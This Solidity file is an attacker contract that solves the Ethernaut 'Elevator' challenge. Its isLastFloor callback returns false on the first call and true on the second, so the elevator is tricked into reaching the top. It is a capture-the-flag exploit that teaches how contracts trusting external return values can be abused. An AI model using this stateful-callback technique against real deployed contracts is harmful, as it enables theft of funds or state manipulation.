// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Elevator, Building} from "ethernaut/levels/Elevator.sol";

contract Attacker is Building {
    Elevator elevator;
    bool isCalled = false;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    // TODO: write a really gas efficient code for this
    function isLastFloor(uint256 /* floor */ ) external returns (bool) {
        if (isCalled) {
            // this is the second call for `top`, should return `true`
            return true;
        } else {
            // this is the first call, should return `false`
            isCalled = true;
            return false;
        }
    }

    // wrapper to call `goTo` on an elevator
    function goTo(uint256 floor) external {
        elevator.goTo(floor);
    }
}
